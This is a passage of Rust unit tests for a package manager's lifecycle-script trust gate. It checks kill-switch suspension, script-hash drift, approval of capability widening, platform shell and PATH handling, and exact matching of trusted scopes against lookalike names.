        &crate::capability::UserBound::default(),
        None,
    );
    assert_eq!(r_on, TrustReason::SuspendedByForceFloor);

    // Flag OFF (same inputs otherwise) → trusted again.
    let r_off = evaluate_trust(
        &pkg_dir,
        "esbuild",
        "0.25.1",
        None,
        &scripts,
        &policy,
        dir.path(),
        ScriptPolicy::Deny,
        false,
        &crate::capability::CapabilitySet::default(),
        &crate::capability::UserBound::default(),
        None,
    );
    assert_eq!(r_off, TrustReason::StrictBinding);
    assert!(r_off.is_trusted());
}

/// Acceptance #4 (complement): packages with no approval at
/// all are Untrusted regardless of the flag. The flag
/// suppresses would-have-been-trusted results; it does NOT
/// transform Untrusted → SuspendedByForceFloor.
#[test]
fn force_floor_does_not_transform_untrusted_to_suspended() {
    let dir = tempfile::tempdir().unwrap();
    std::fs::write(
        dir.path().join("package.json"),
        r#"{"name":"proj"}"#, // no trustedDependencies at all
    )
    .unwrap();
    let store = PackageStore::at(dir.path().join("store"));
    let _lpm_root = lpm_common::LpmRoot::from_dir(dir.path());
    let pkg_dir = write_scripted_pkg(&store, "no-approval", "1.0.0", "echo hi");
    let policy = SecurityPolicy::from_package_json(&dir.path().join("package.json"));
    let scripts = read_lifecycle_scripts(&pkg_dir.join("package.json")).unwrap();

    let with_flag = evaluate_trust(
        &pkg_dir,
        "no-approval",
        "1.0.0",
        None,
        &scripts,
        &policy,
        dir.path(),
        ScriptPolicy::Deny,
        true,
        &crate::capability::CapabilitySet::default(),
        &crate::capability::UserBound::default(),
        None,
    );
    assert_eq!(
        with_flag,
        TrustReason::Untrusted,
        "no approval → Untrusted regardless of flag"
    );
    let without_flag = evaluate_trust(
        &pkg_dir,
        "no-approval",
        "1.0.0",
        None,
        &scripts,
        &policy,
        dir.path(),
        ScriptPolicy::Deny,
        false,
        &crate::capability::CapabilitySet::default(),
        &crate::capability::UserBound::default(),
        None,
    );
    assert_eq!(without_flag, TrustReason::Untrusted);
}

/// Force flag also suspends `ScopedGlob` trust (project
/// `trustedScopes` match). Same semantic as StrictBinding:
/// a loosening extended by project config is suspended by
/// the user kill-switch.
#[test]
fn force_floor_true_suspends_scoped_glob_trust() {
    let dir = tempfile::tempdir().unwrap();
    let body = serde_json::json!({
        "name": "test-project",
        "lpm": {
            "scripts": {
                "trustedScopes": ["@myorg/*"]
            }
        }
    });
    std::fs::write(dir.path().join("package.json"), body.to_string()).unwrap();
    let store = PackageStore::at(dir.path().join("store"));
    let _lpm_root = lpm_common::LpmRoot::from_dir(dir.path());
    let pkg_dir = write_scripted_pkg(&store, "@myorg/util", "1.0.0", "echo hi");
    let policy = SecurityPolicy::from_package_json(&dir.path().join("package.json"));
    let scripts = read_lifecycle_scripts(&pkg_dir.join("package.json")).unwrap();

    let without_flag = evaluate_trust(
        &pkg_dir,
        "@myorg/util",
        "1.0.0",
        None,
        &scripts,
        &policy,
        dir.path(),
        ScriptPolicy::Deny,
        false,
        &crate::capability::CapabilitySet::default(),
        &crate::capability::UserBound::default(),
        None,
    );
    assert_eq!(without_flag, TrustReason::ScopedGlob);
    assert!(without_flag.is_trusted());

    let with_flag = evaluate_trust(
        &pkg_dir,
        "@myorg/util",
        "1.0.0",
        None,
        &scripts,
        &policy,
        dir.path(),
        ScriptPolicy::Deny,
        true,
        &crate::capability::CapabilitySet::default(),
        &crate::capability::UserBound::default(),
        None,
    );
    assert_eq!(with_flag, TrustReason::SuspendedByForceFloor);
    assert!(!with_flag.is_trusted());
}

/// Acceptance #5: SuspendedByForceFloor is classified as
/// not-trusted. Pins the `is_trusted()` contract from the
/// enum side so a future refactor of the boolean can't
/// accidentally flip this variant.
#[test]
fn suspended_by_force_floor_reports_not_trusted() {
    assert!(!TrustReason::SuspendedByForceFloor.is_trusted());
}

/// Force-flag semantic for `BindingDrift`: drift is ALREADY
/// not-trusted (the user approved a different script body
/// previously), so the flag doesn't need to intercept it.
/// `BindingDrift` should pass through unchanged even under
/// the flag. This matters because the UX message for
/// BindingDrift is "re-approve THIS package" — routing it
/// through `SuspendedByForceFloor` would send the wrong
/// remediation.
#[test]
fn force_floor_preserves_binding_drift_distinct_from_suspension() {
    let dir = tempfile::tempdir().unwrap();
    let store = PackageStore::at(dir.path().join("store"));
    let _lpm_root = lpm_common::LpmRoot::from_dir(dir.path());
    let pkg_dir = write_scripted_pkg(&store, "sharp", "0.33.0", "node-gyp rebuild");
    // Record an approval with a stale script hash so the
    // strict gate reports BindingDrift instead of Strict.
    write_pkg_json_with_strict_approval(
        dir.path(),
        "sharp",
        "0.33.0",
        "sha256-this-hash-will-not-match",
    );
    let policy = SecurityPolicy::from_package_json(&dir.path().join("package.json"));
    let scripts = read_lifecycle_scripts(&pkg_dir.join("package.json")).unwrap();

    let reason = evaluate_trust(
        &pkg_dir,
        "sharp",
        "0.33.0",
        None,
        &scripts,
        &policy,
        dir.path(),
        ScriptPolicy::Deny,
        true, // flag ON
        &crate::capability::CapabilitySet::default(),
        &crate::capability::UserBound::default(),
        None,
    );
    // BindingDrift takes precedence — not suspended, because
    // it wasn't trusted to begin with.
    assert_eq!(reason, TrustReason::BindingDrift);
    assert!(!reason.is_trusted());
}

// ── capability gate in evaluate_trust ──

fn capability_test_fixture() -> (
    tempfile::TempDir,
    PackageStore,
    PathBuf,
    HashMap<String, String>,
    SecurityPolicy,
) {
    // Reusable fixture for capability-gate tests: project dir
    // with a package.json that ALREADY has a strict approval
    // for esbuild@1.0.0, plus a store package at the same
    // name+version with a known lifecycle script. Tests
    // vary the capability set / user bound / binding hash
    // they pass in.
    let dir = tempfile::tempdir().unwrap();
    let store = PackageStore::at(dir.path().join("store"));
    let _lpm_root = lpm_common::LpmRoot::from_dir(dir.path());
    let pkg_dir = write_scripted_pkg(&store, "esbuild", "1.0.0", "node-gyp rebuild");
    let hash = compute_script_hash(&pkg_dir).expect("script hash");
    write_pkg_json_with_strict_approval(dir.path(), "esbuild", "1.0.0", &hash);
    let policy = SecurityPolicy::from_package_json(&dir.path().join("package.json"));
    let scripts = read_lifecycle_scripts(&pkg_dir.join("package.json")).unwrap();
    (dir, store, pkg_dir, scripts, policy)
}

/// Baseline capability set + trusted binding → passes through.
/// Behavior-preservation check: existing tests assume
/// this. Pins the short-circuit.
#[test]
fn capability_baseline_passes_through_strict_binding() {
    let (dir, _store, pkg_dir, scripts, policy) = capability_test_fixture();
    let baseline = crate::capability::CapabilitySet::default();
    let user = crate::capability::UserBound::default();

    let reason = evaluate_trust(
        &pkg_dir,
        "esbuild",
        "1.0.0",
        None,
        &scripts,
        &policy,
        dir.path(),
        ScriptPolicy::Deny,
        false,
        &baseline,
        &user,
        None,
    );
    assert_eq!(reason, TrustReason::StrictBinding);
    assert!(reason.is_trusted());
}

/// Tighter-than-user-bound request + trusted binding → passes
/// through (no approval needed for narrower-than-ceiling
/// rlimits).
#[test]
fn capability_tighter_than_ceiling_passes_through() {
    let (dir, _store, pkg_dir, scripts, policy) = capability_test_fixture();
    let request = crate::capability::CapabilitySet {
        sandbox_limits: [(crate::capability::RlimitKey::Nproc, 512)]
            .into_iter()
            .collect(),
        ..Default::default()
    };
    let user = crate::capability::UserBound {
        sandbox_limits_ceiling: [(crate::capability::RlimitKey::Nproc, 4096)]
            .into_iter()
            .collect(),
    };

    let reason = evaluate_trust(
        &pkg_dir,
        "esbuild",
        "1.0.0",
        None,
        &scripts,
        &policy,
        dir.path(),
        ScriptPolicy::Deny,
        false,
        &request,
        &user,
        None,
    );
    assert_eq!(reason, TrustReason::StrictBinding);
}

/// Widening request + legacy binding (capability_hash = None,
/// the state this fixture produces by default) →
/// CapabilityNotApproved. The legacy approval covers baseline
/// only; the widened request is not approved.
#[test]
fn capability_widening_against_legacy_binding_is_not_approved() {
    let (dir, _store, pkg_dir, scripts, policy) = capability_test_fixture();
    let request = crate::capability::CapabilitySet {
        pass_env: ["SSH_AUTH_SOCK".to_string()].into_iter().collect(),
        ..Default::default()
    };
    let user = crate::capability::UserBound::default();

    let reason = evaluate_trust(
        &pkg_dir,
        "esbuild",
        "1.0.0",
        None,
        &scripts,
        &policy,
        dir.path(),
        ScriptPolicy::Deny,
        false,
        &request,
        &user,
        None,
    );
    assert_eq!(reason, TrustReason::CapabilityNotApproved);
    assert!(!reason.is_trusted());
}

/// Widening request + binding with matching capability hash →
/// trust granted (the user reviewed the exact widening).
/// Setup uses a helper that writes a capability-hash into the
/// binding directly (the approve-scripts write path is tested separately).
#[test]
fn capability_widening_with_matching_hash_is_approved() {
    let dir = tempfile::tempdir().unwrap();
    let store = PackageStore::at(dir.path().join("store"));
    let _lpm_root = lpm_common::LpmRoot::from_dir(dir.path());
    let pkg_dir = write_scripted_pkg(&store, "esbuild", "1.0.0", "node-gyp rebuild");
    let script_hash = compute_script_hash(&pkg_dir).expect("script hash");

    // Build the capability request + its canonical hash.
    let request = crate::capability::CapabilitySet {
        pass_env: ["SSH_AUTH_SOCK".to_string()].into_iter().collect(),
        ..Default::default()
    };
    let cap_hash = request.canonical_hash();

    // Write a package.json that stores BOTH the strict approval
    // (script hash matches) AND the capability hash for the
    // request above.
    let key = "esbuild@1.0.0";
    let body = serde_json::json!({
        "name": "test-project",
        "lpm": {
            "trustedDependencies": {
                key: {
                    "scriptHash": script_hash,
                    "capabilityHash": cap_hash,
                }
            }
        }
    });
    std::fs::write(dir.path().join("package.json"), body.to_string()).unwrap();
    let policy = SecurityPolicy::from_package_json(&dir.path().join("package.json"));
    let scripts = read_lifecycle_scripts(&pkg_dir.join("package.json")).unwrap();
    let user = crate::capability::UserBound::default();

    let reason = evaluate_trust(
        &pkg_dir,
        "esbuild",
        "1.0.0",
        None,
        &scripts,
        &policy,
        dir.path(),
        ScriptPolicy::Deny,
        false,
        &request,
        &user,
        None,
    );
    assert_eq!(reason, TrustReason::StrictBinding);
    assert!(reason.is_trusted());
}

/// Widening request + binding with MISMATCHED capability hash
/// (drift) → CapabilityNotApproved. Pins the hash-drift-
/// invalidates-trust rule.
#[test]
fn capability_widening_with_drifted_hash_is_not_approved() {
    let dir = tempfile::tempdir().unwrap();
    let store = PackageStore::at(dir.path().join("store"));
    let _lpm_root = lpm_common::LpmRoot::from_dir(dir.path());
    let pkg_dir = write_scripted_pkg(&store, "esbuild", "1.0.0", "node-gyp rebuild");
    let script_hash = compute_script_hash(&pkg_dir).expect("script hash");

    // User approved ONE capability set; package now requests a
    // DIFFERENT one. Hash mismatch → CapabilityNotApproved.
    let approved = crate::capability::CapabilitySet {
        pass_env: ["FOO".to_string()].into_iter().collect(),
        ..Default::default()
    };
    let key = "esbuild@1.0.0";
    let body = serde_json::json!({
        "name": "test-project",
        "lpm": {
            "trustedDependencies": {
                key: {
                    "scriptHash": script_hash,
                    "capabilityHash": approved.canonical_hash(),
                }
            }
        }
    });
    std::fs::write(dir.path().join("package.json"), body.to_string()).unwrap();
    let policy = SecurityPolicy::from_package_json(&dir.path().join("package.json"));
    let scripts = read_lifecycle_scripts(&pkg_dir.join("package.json")).unwrap();

    // Package now requests something different.
    let new_request = crate::capability::CapabilitySet {
        pass_env: ["FOO".to_string(), "BAR".to_string()].into_iter().collect(),
        ..Default::default()
    };
    let user = crate::capability::UserBound::default();

    let reason = evaluate_trust(
        &pkg_dir,
        "esbuild",
        "1.0.0",
        None,
        &scripts,
        &policy,
        dir.path(),
        ScriptPolicy::Deny,
        false,
        &new_request,
        &user,
        None,
    );
    assert_eq!(reason, TrustReason::CapabilityNotApproved);
}

/// Widening request + NO binding at all (unapproved package)
/// → the upstream layer returns Untrusted, so the capability
/// gate doesn't fire — we preserve the more actionable
/// "not trusted at all" reason rather than layering
/// CapabilityNotApproved on top.
#[test]
fn capability_widening_on_untrusted_package_keeps_untrusted_reason() {
    let dir = tempfile::tempdir().unwrap();
    std::fs::write(dir.path().join("package.json"), r#"{"name":"proj"}"#).unwrap();
    let store = PackageStore::at(dir.path().join("store"));
    let _lpm_root = lpm_common::LpmRoot::from_dir(dir.path());
    let pkg_dir = write_scripted_pkg(&store, "unapproved", "1.0.0", "echo hi");
    let policy = SecurityPolicy::from_package_json(&dir.path().join("package.json"));
    let scripts = read_lifecycle_scripts(&pkg_dir.join("package.json")).unwrap();
    let request = crate::capability::CapabilitySet {
        pass_env: ["FOO".to_string()].into_iter().collect(),
        ..Default::default()
    };
    let user = crate::capability::UserBound::default();

    let reason = evaluate_trust(
        &pkg_dir,
        "unapproved",
        "1.0.0",
        None,
        &scripts,
        &policy,
        dir.path(),
        ScriptPolicy::Deny,
        false,
        &request,
        &user,
        None,
    );
    assert_eq!(reason, TrustReason::Untrusted);
}

/// force-security-floor + widening request still returns
/// SuspendedByForceFloor, NOT CapabilityNotApproved. The
/// kill-switch takes precedence over the capability gate — a
/// flag-set user's diagnostic should point at the flag, not
/// the capability system.
#[test]
fn capability_widening_under_force_flag_stays_suspended() {
    let (dir, _store, pkg_dir, scripts, policy) = capability_test_fixture();
    let request = crate::capability::CapabilitySet {
        pass_env: ["FOO".to_string()].into_iter().collect(),
        ..Default::default()
    };
    let user = crate::capability::UserBound::default();

    let reason = evaluate_trust(
        &pkg_dir,
        "esbuild",
        "1.0.0",
        None,
        &scripts,
        &policy,
        dir.path(),
        ScriptPolicy::Deny,
        true, // force-security-floor ON
        &request,
        &user,
        None,
    );
    // Trust was going to be granted (StrictBinding), force
    // flag intercepted before the capability gate could fire.
    assert_eq!(reason, TrustReason::SuspendedByForceFloor);
}

/// CapabilityNotApproved reports not-trusted via
/// `is_trusted()`, ensuring the is_trusted contract stays
/// consistent with the variant's semantic.
#[test]
fn capability_not_approved_reports_not_trusted() {
    assert!(!TrustReason::CapabilityNotApproved.is_trusted());
}

/// the shell invocation for lifecycle scripts must
/// be platform-aware. Before the sandbox returned
/// `UnsupportedPlatform` on Windows so this code path never
/// fired there; with the real backend landed, `sh -c` would
/// fail at spawn because `sh.exe` isn't on the standard Windows
/// PATH. The helper picks `cmd.exe /D /C` instead so end-to-end
/// Windows installs actually work.
#[cfg(windows)]
#[test]
fn platform_shell_invocation_uses_cmd_exe_on_windows() {
    let (prog, args) = platform_shell_invocation("node install.js");
    assert_eq!(prog, "cmd.exe");
    assert_eq!(
        args,
        vec![
            "/D".to_string(),
            "/C".to_string(),
            "node install.js".to_string()
        ],
        "Windows lifecycle scripts must run under cmd.exe /D /C, \
             /D suppresses AutoRun, /C runs-and-exits"
    );
}

#[cfg(unix)]
#[test]
fn platform_shell_invocation_uses_sh_on_unix() {
    let (prog, args) = platform_shell_invocation("node install.js");
    assert_eq!(prog, "sh");
    assert_eq!(
        args,
        vec!["-c".to_string(), "node install.js".to_string()],
        "POSIX hosts must run lifecycle scripts under sh -c"
    );
}

/// the lifecycle PATH must use the host's
/// native separator and a non-empty fallback for the case where
/// the caller didn't pass through a parent PATH. The previous
/// helper inlined POSIX `:` + `/usr/bin:/bin`, producing
/// `node_modules\.bin:<parent>` on Windows — a single malformed
/// entry that no PATH lookup would resolve.
#[cfg(windows)]
#[test]
fn build_lifecycle_path_uses_semicolon_and_system32_on_windows() {
    let project = std::path::PathBuf::from(r"C:\proj");
    // With an inherited parent PATH.
    let with_parent = build_lifecycle_path(&project, Some(r"C:\OtherTool\bin;C:\Windows\System32"));
    assert!(
        with_parent.starts_with(r"C:\proj\node_modules\.bin;"),
        "node_modules\\.bin must lead the PATH with a `;` separator: {with_parent}"
    );
    assert!(
        with_parent.contains(r"C:\OtherTool\bin"),
        "inherited parent PATH must be appended: {with_parent}"
    );

    // Without an inherited parent PATH (fallback path).
    let fallback = build_lifecycle_path(&project, None);
    assert!(
        fallback.starts_with(r"C:\proj\node_modules\.bin;"),
        "fallback PATH must still lead with node_modules\\.bin: {fallback}"
    );
    assert!(
        fallback.contains(r"C:\Windows\System32"),
        "fallback must include System32 so cmd.exe / where.exe resolve: {fallback}"
    );
    assert!(
        !fallback.contains("/usr/bin"),
        "fallback must NOT leak POSIX defaults on Windows: {fallback}"
    );
}

#[cfg(unix)]
#[test]
fn build_lifecycle_path_uses_colon_and_usr_bin_on_unix() {
    let project = std::path::PathBuf::from("/proj");
    let with_parent = build_lifecycle_path(&project, Some("/opt/tool/bin:/usr/local/bin"));
    assert!(
        with_parent.starts_with("/proj/node_modules/.bin:"),
        "node_modules/.bin must lead with `:` separator: {with_parent}"
    );

    let fallback = build_lifecycle_path(&project, None);
    assert!(
        fallback.starts_with("/proj/node_modules/.bin:/usr/bin:/bin"),
        "fallback must keep the historical POSIX shape: {fallback}"
    );
}

/// `@myorg/*` glob must match exactly the `@myorg` scope —
/// `@myorg-evil/pkg` is a different scope and must NOT inherit
/// the trust. Previously the `starts_with("@myorg")` check let a
/// lookalike scope bypass the lifecycle approval gate.
#[test]
fn trusted_scope_glob_requires_exact_scope_boundary() {
    let scopes = vec!["@myorg/*".to_string()];

    // Real members of the trusted scope.
    assert!(name_matches_trusted_scope("@myorg/build-helper", &scopes));
    assert!(name_matches_trusted_scope("@myorg/x", &scopes));

    // Lookalike scopes that previously matched via starts_with —
    // must NOT match after the fix.
    assert!(
        !name_matches_trusted_scope("@myorg-evil/pkg", &scopes),
        "@myorg-evil is a distinct scope and must not inherit @myorg trust",
    );
    assert!(
        !name_matches_trusted_scope("@myorganization/pkg", &scopes),
        "@myorganization is a distinct scope and must not inherit @myorg trust",
    );
    assert!(
        !name_matches_trusted_scope("@myorg", &scopes),
        "bare `@myorg` (no member) must not match `@myorg/*`",
    );
}

#[test]
fn trusted_scope_exact_pattern_still_matches() {
    let scopes = vec!["exact-pkg".to_string()];
    assert!(name_matches_trusted_scope("exact-pkg", &scopes));
    assert!(!name_matches_trusted_scope("exact-pkg-evil", &scopes));
    assert!(!name_matches_trusted_scope("other-pkg", &scopes));
}
